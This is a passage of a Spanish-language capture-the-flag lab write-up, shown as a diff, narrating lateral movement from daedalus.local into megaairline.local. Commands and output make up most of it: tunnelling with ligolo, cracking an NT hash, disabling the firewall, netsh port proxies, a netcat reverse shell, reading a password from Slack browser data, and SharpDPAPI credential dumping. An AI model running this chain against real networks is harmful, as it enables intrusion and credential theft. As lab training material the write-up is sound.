@@ -837,3 +837,386 @@ PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
 ASCENSION{*****************}
 PS C:\Users\Administrator\Documents>
 ```
+
+Se realizaron varias acciones para establecer la conexión entre los equipos y explorar la red:
+
+1. Se identificó que había una interfaz de red adicional en la red 192.168.11.0/24 además de la interfaz de dominio estándar.
+2. Se utilizó el módulo PowerView.ps1 para enumerar los dominios y se encontró otro dominio llamado megaairline.local que estaba en relación con el dominio daedalus.local.
+3. Se resolvió el problema de la conectividad entre los equipos mediante ligolo. Se configuró un redireccionamiento en ligolo desde el equipo WEB01 al equipo local para el puerto 8888.
+4. Se inició una sesión de Evil-WinRM desde el equipo DC1 al equipo WEB01 a través del puerto 8888, estableciendo así una conexión entre los dos equipos.
+5. Se agregó la subred 192.168.10.0/24 a la interfaz de ligolo para permitir la conexión con todos los equipos de la red.
+6. Se escaneó la subred 192.168.11.0/24 utilizando CrackMapExec y se identificaron tres equipos: DC1, DC2 y MS01, pertenecientes al dominio megaairline.local.
+7. Se agregaron las direcciones IP de los equipos identificados junto con sus dominios correspondientes al archivo /etc/hosts para facilitar la resolución de nombres.
+8. Se realizó un escaneo de puertos en la subred 192.168.11.0/24 con nmap, revelando que el equipo MS01 tenía el puerto 80 abierto, lo que indica la presencia de un posible servicio web en ese equipo.
+
+```powershell
+PS C:\Users\Administrator\Documents> Import-Module .\PowerView.ps1  
+PS C:\Users\Administrator\Documents> Invoke-MapDomainTrust
+
+SourceName      : daedalus.local
+TargetName      : megaairline.local
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 10/10/2020 5:48:47 PM
+WhenChanged     : 9/1/2023 2:59:58 AM
+
+PS C:\Users\Administrator\Documents>
+```
+
+```powershell
+[Agent : WEB01\svc_dev@WEB01] » listener_add --addr 192.168.10.39:8888 --to 10.10.14.10:8888  
+INFO[0173] Listener created on remote agent! 
+[Agent : WEB01\svc_dev@WEB01] »
+```
+
+```powershell
+PS C:\Users\Administrator\Documents> .\agent.exe -connect 192.168.10.39:8888 -ignore-cert  
+```
+
+```bash
+Agent : WEB01\svc_dev@WEB01] » 
+INFO[0179] Agent joined.           name="DAEDALUS\\Administrator@DC1" remote="10.10.14.10:47204"  
+[Agent : WEB01\svc_dev@WEB01] » session
+? Specify a session : 2 - DAEDALUS\Administrator@DC1 - 10.10.14.10:47204
+[Agent : DAEDALUS\Administrator@DC1] » start
+INFO[0190] Starting tunnel to DAEDALUS\Administrator@DC1 
+[Agent : DAEDALUS\Administrator@DC1] »
+```
+
+```bash
+❯ sudo ip route add 192.168.11.0/24 dev ligolo
+
+❯ ping -c1 -w1 192.168.11.6
+PING 192.168.11.6 (192.168.11.6) 56(84) bytes of data.
+64 bytes from 192.168.11.6: icmp_seq=1 ttl=64 time=162 ms
+
+--- 192.168.11.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms  
+rtt min/avg/max/mdev = 161.931/161.931/161.931/0.000 ms
+```
+
+```bash
+❯ crackmapexec smb 192.168.11.0/24
+SMB         192.168.11.6    445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
+SMB         192.168.11.201  445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)
+SMB         192.168.11.210  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:megaairline.local) (signing:False) (SMBv1:False)  
+```
+
+```bash
+❯ echo "192.168.11.210 ms01.megaairline.local" | sudo tee -a /etc/hosts
+
+❯ echo "192.168.11.201 megaairline.local dc2.megaairline.local" | sudo tee -a /etc/hosts  
+```
+
+```bash
+❯ nmap ms01.megaairline.local -Pn
+Nmap scan report for ms01.megaairline.local (192.168.11.210)  
+PORT     STATE SERVICE
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+❯ nmap dc2.megaairline.local -Pn
+Nmap scan report for dc2.megaairline.local (192.168.11.201)  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+```
+
+  
+Luego de explorar la página web y encontrarnos con la página por defecto de IIS, utilizamos la herramienta wfuzz para realizar un ataque de fuerza bruta en los directorios de la web utilizando un diccionario. Esta exploración nos llevó al descubrimiento del directorio /secretserver.
+
+Al acceder a este directorio, nos encontramos con un formulario de inicio de sesión de Thycotic que requiere credenciales para acceder.
+
+Durante la fase de volcado del ntds de DC1, se pudo observar el hash NT del usuario "elliot". Utilizando la herramienta John the Ripper, logramos romper este hash y obtener la contraseña correspondiente.
+
+```bash
+❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=NT  
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 XOP 4x2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+84@m!n@9         (?)
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+
+Resulta interesante destacar que las credenciales obtenidas a través del hash NT del usuario "elliot" también son válidas para la autenticación mediante SMB (Server Message Block) en el nuevo dominio. Esto sugiere una posible reutilización de credenciales entre los dominios, lo que puede tener implicaciones significativas en términos de la seguridad de la red y la gestión de privilegios.
+
+```bash
+❯ crackmapexec smb dc2.megaairline.local -u elliot -p '84@m!n@9'
+SMB         megaairline.local 445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
+SMB         megaairline.local 445    DC2              [+] megaairline.local\elliot:84@m!n@9
+```
+
+Las credenciales obtenidas tambien podemos usarlas para el login de `thycotic` autenticandonos como el usuario `elliot`, de esta manera obtenemos acceso
+
+En el apartado "Admin > Scripts" de la interfaz, observamos una serie de scripts disponibles, específicamente en la sección de SSH. Al intentar ejecutar uno de estos scripts, se nos solicita información adicional. Para el servidor, seleccionamos 127.0.0.1, y utilizamos las credenciales de elliot a nivel de dominio. Este proceso parece establecer una conexión SSH interna y ejecutar un comando. Aunque se solicita un argumento, por el momento lo dejaremos en blanco.
+
+Después de enviar la solicitud, observamos un error relacionado con la ejecución de un comando en la consola, lo que sugiere que se ha establecido una conexión SSH interna y se ha intentado ejecutar el comando proporcionado.
+
+Para probar la funcionalidad, proporcionamos un simple comando "whoami" como argumento. Al recibir la respuesta, confirmamos que el comando se ejecutó como el usuario elliot, lo que nos indica que podemos ejecutar comandos de forma remota.
+
+Finalmente, ajustamos el comando y solicitamos la lectura de la bandera en el escritorio de este usuario.
+
+![](/assets/images/ASC1.jpg)
+
+Es importante recordar que actualmente no contamos con una conexión directa a la máquina destino. Para facilitar algunas tareas, utilizaremos el equipo DC1 como intermediario.
+
+Antes de proceder, habilitaremos el Protocolo de Escritorio Remoto (RDP) en la máquina objetivo. Una vez habilitado, nos conectaremos a la máquina utilizando una herramienta como xfreerdp, que nos permitirá acceder de forma remota al escritorio de la máquina objetivo desde nuestra máquina local.
+
+```bash
+ crackmapexec smb dc1.daedalus.local -u Administrator -p pleasefastenyourseatbelts01! -M rdp -o ACTION=enable
+SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
+SMB         daedalus.local  445    DC1              [+] daedalus.local\Administrator:pleasefastenyourseatbelts01! (Pwn3d!)
+RDP         daedalus.local  445    DC1              [+] RDP enabled successfully
+
+❯ xfreerdp /u:Administrator /p:pleasefastenyourseatbelts01! /v:dc1.daedalus.local /dynamic-resolution /cert:ignore
+```
+
+Para configurar un servidor HTTP en el equipo DC1, que tiene conexión directa con el otro dominio, primero subiremos un archivo MSI de Python y lo instalaremos para poder utilizarlo.
+
+Una vez instalado Python, podremos usarlo para crear un servidor HTTP en el directorio "Documents", desde donde podremos compartir cualquier archivo que deseemos a través de un servidor HTTP en el DC1.
+
+```powershell
+PS C:\Users\Administrator\Documents> upload python-3.4.4.amd64.msi
+
+Info: Uploading python-3.4.4.amd64.msi to C:\Users\Administrator\Documents\python-3.4.4.amd64.msi  
+
+Data: 34739540 bytes of 34739540 bytes copied
+
+Info: Upload successful!
+
+PS C:\Users\Administrator\Documents>
+```
+
+Aunque enfrentamos una limitación adicional debido al firewall, podemos deshabilitarlo fácilmente para permitir el tráfico necesario. Esto nos facilitará la configuración y el funcionamiento del servidor HTTP en el equipo DC1.
+
+```powershell
+PS C:\Users\Administrator\Documents> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False  
+PS C:\Users\Administrator\Documents>
+```
+
+A continuación, procederemos a subir el archivo `netcat.exe` al servidor HTTP que hemos creado en el equipo DC1.
+
+Una vez subido el archivo, utilizaremos el comando `curl` ejecutado como el usuario `elliot` para realizar una solicitud al archivo `netcat.exe` compartido en el DC1 y lo guardaremos en el directorio `C:\ProgramData`. Este proceso nos permitirá transferir el archivo `netcat.exe` al equipo DC1 para su posterior uso.
+
+```powershell
+PS C:\Users\Administrator\Documents> upload netcat.exe
+
+Info: Uploading netcat.exe to C:\Users\Administrator\Documents\netcat.exe  
+
+Data: 58260 bytes of 58260 bytes copied
+
+Info: Upload successful!
+
+PS C:\Users\Administrator\Documents>
+```
+
+```bash
+curl 192.168.11.6/netcat.exe -o C:\ProgramData\netcat.exe 
+```
+
+Para establecer una conexión de reverse shell, utilizaremos el comando `netsh` en el equipo DC1 para redirigir el tráfico del puerto 4444 hacia el equipo WEB01, y desde allí hacia nuestro equipo a través del mismo puerto.
+
+Este enfoque nos permitirá configurar la redirección de puertos de manera que cualquier tráfico entrante al puerto 4444 del DC1 se reenvíe primero a WEB01 y luego a nuestro equipo, lo que nos permitirá establecer una conexión de reverse shell de manera efectiva.
+
+```powershell
+PS C:\Users\Administrator\Documents> python -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 ...
+192.168.11.210 - - "GET /netcat.exe HTTP/1.1" 200 -
+```
+
+```powershell
+PS C:\Users\Administrator\Documents> netsh interface portproxy add v4tov4 listenaddress=192.168.11.6 listenport=4444 connectaddress=192.168.10.39 connectport=4444  
+PS C:\Users\Administrator\Documents>
+```
+
+```powershell
+PS C:\Users\Administrator\Documents> netsh interface portproxy add v4tov4 listenaddress=192.168.10.39 listenport=4444 connectaddress=10.10.14.10 connectport=4444  
+PS C:\Users\Administrator\Documents>
+```
+
+Entiendo. Para completar la operación, ejecutaremos el archivo `netcat.exe` en la página web del servidor DC1. Esto enviará una shell inversa a DC1, que después de redirigir el tráfico, finalmente la enviará a nuestro equipo atacante.
+
+Una vez completado este proceso, recibiremos una shell como el usuario `elliot` en el equipo MS01. En el directorio de descargas de este equipo, encontramos el instalador de Slack. Esta podría ser una pista importante. Tras una exhaustiva enumeración, descubrimos una base de datos con el nombre "7" dentro del directorio de Chrome, la cual copiaremos a la ruta C:\ProgramData.
+
+```bash
+cmd /c C:\ProgramData\netcat.exe -e powershell 192.168.11.6 4444  
+```
+
+```powershell
+❯ netcat -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.13.38.20
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Users\elliot> whoami
+megaairline\elliot
+PS C:\Users\elliot>
+```
+
+```powershell
+PS C:\Users\elliot\Downloads> dir
+
+    Directory: C:\Users\elliot\Downloads
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/16/2020   8:00 AM       83040752 SlackSetup.exe  
+
+PS C:\Users\elliot\Downloads>
+```
+
+```powershell
+PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00> dir
+
+    Directory: C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a----       10/16/2020   9:28 AM         170673 7                             
+
+PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00> cp 7 C:\ProgramData  
+PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00>
+```
+
+Parece que hemos descubierto una contraseña asociada al usuario "elliot", la cual se menciona como una cuenta administrativa en el contexto de un sistema. Sin embargo, al revisar los administradores locales, encontramos que "elliot" está presente solo a nivel local y no a nivel de dominio. A pesar de esto, al intentar usar la contraseña asociada a "elliot", confirmamos que es válida a nivel local.
+
+Sin embargo, al acceder al sistema mediante RDP y abrir una terminal de comando, descubrimos que tenemos privilegios de administrador, lo que nos permite leer la flag sin problemas. Esto indica que la contraseña de "elliot" otorga privilegios de administrador a nivel local en la máquina, lo que nos permite acceder a la flag.
+
+```powershell
+PS C:\ProgramData> Import-Module .\Get-Strings.ps1
+PS C:\ProgramData> Get-Strings 7 | Select-String password
+
+needs_initial_password_setF"
+text"6local account username: elliot password: LetMeInAgain!{
+text"6local account username: elliot password: LetMeInAgain!"
+text"!MS01 admin account and password: {
+text";MS01 admin account and password: ```elliot LetMeInAgain!```"  
+
+PS C:\ProgramData>
+```
+
+```powershell
+PS C:\ProgramData> net localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain  
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+elliot
+MEGAAIRLINE\Domain Admins
+The command completed successfully.
+
+PS C:\ProgramData>
+```
+
+```bash
+❯ crackmapexec smb ms01.megaairline.local -u elliot -p LetMeInAgain! --local-auth 
+SMB         ms01.megaairline.local 445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)  
+SMB         ms01.megaairline.local 445    MS01             [+] MS01\elliot:LetMeInAgain!
+```
+
+```powershell
+❯ xfreerdp /u:elliot /p:LetMeInAgain! /v:ms01.megaairline.local /dynamic-resolution /cert:ignore  
+```
+
+Usaremos SharpDPAPI nuevamente para extraer la contraseña del usuario "Administrator" en MS01. Es importante tener en cuenta que es probable que esta contraseña sea válida solo a nivel local en el equipo MS01.
+
+```powershell
+PS C:\Users\elliot.MS01\Desktop> curl 192.168.11.6/SharpDPAPI.exe -o SharpDPAPI.exe
+PS C:\Users\elliot.MS01\Desktop> .\SharpDPAPI.exe machinetriage
+
+  __                 _   _       _ ___
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                |
+  v1.11.3
+
+
+[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage
+
+[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+[*] RevertToSelf()
+
+[*] Secret  : DPAPI_SYSTEM
+[*]    full: 487772FBFFEDCCD08B08239AF25F7C42A0C2AB7636CBEDE3241336B34893574F96C27A7411F18A6C
+[*]    m/u : 487772FBFFEDCCD08B08239AF25F7C42A0C2AB76 / 36CBEDE3241336B34893574F96C27A7411F18A6C  
+
+[*] SYSTEM master key cache:
+
+{236ba6f2-6d51-4312-beb2-365eb2897601}:E9AB8AB7568ABEEA751B1D5B4A8C14A682DE5CC4
+{6af669bc-5e57-413c-ba26-6d63fb62c794}:78EF352E05532ADF635D9AFEEC839B96E99601A6
+{b88476d3-b611-4e16-be7f-8525fb5dcd4f}:14F7A4B882D7D01EDF4C9015E10868649F58D159
+{bd0e6c0c-1301-4c56-90f0-4dd4504dc8ce}:F2FBB1F90F09F29D7B20D4366BCE33C9B439CC81
+{c21c474c-ad42-425f-babf-623340194247}:451EE9B8011CEF62A3404F44A64B2ACD93CD9FDB
+{360b584f-7027-4f23-85ad-b13720f57979}:58B9072F514E39AB9036140775FA34FE852924E4
+{b0724227-4609-4b11-81ad-4694b3e3e947}:C5CCE9487809C753C814848080BF1DD16985B509
+{e85f73ce-4638-49bf-a1b2-984e0be4890b}:1C834ECB6C3DC3502001A4974DDF46E01141FDDF
+{f52cb0ce-0f39-422a-bff2-68b49e60beb5}:11D1FB8FB59C7E18C8600959C13DF23FE22C8ADE
+
+[*] Triaging System Credentials
+
+Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+  CredFile           : 7E6A4CF66305FBFB5B060CD27A723F46
+
+    guidMasterKey    : {360b584f-7027-4f23-85ad-b13720f57979}
+    size             : 576
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    LastWritten      : 10/14/2020 10:33:07 AM
+    TargetName       : Domain:batch=TaskScheduler:Task:{A7499C51-AB7C-44BF-9314-6A305239E450}
+    TargetAlias      :
+    Comment          :
+    UserName         : MS01\Administrator
+    Credential       : FWErfsgt4ghd7f6dwx
+
+PS C:\Users\elliot.MS01\Desktop>
+```
+
+Al comprobar la contraseña del usuario "Administrator" localmente con `crackmapexec`, recibimos una confirmación de que es válida, lo que nos indica que tenemos acceso total al sistema. Podemos proceder a conectarnos con `wmiexec` y obtener una shell de PowerShell como este usuario.
+
+```bash
+❯ crackmapexec smb ms01.megaairline.local -u Administrator -p FWE*************}f6dwx --local-auth
+SMB         ms01.megaairline.local 445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)  
+SMB         ms01.megaairline.local 445    MS01             [+] MS01\Administrator:FWErf*************}dwx (Pwn3d!)
+```
+
+```powershell
+❯ impacket-wmiexec WORKGROUP/Administrator:FWEr*************}6dwx@ms01.megaairline.local -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> whoami
+ms01\administrator
+
+PS C:\> type C:\Users\Administrator\Desktop\flag.txt
+ASCENSION{sL4ck*************}
+```
+
+
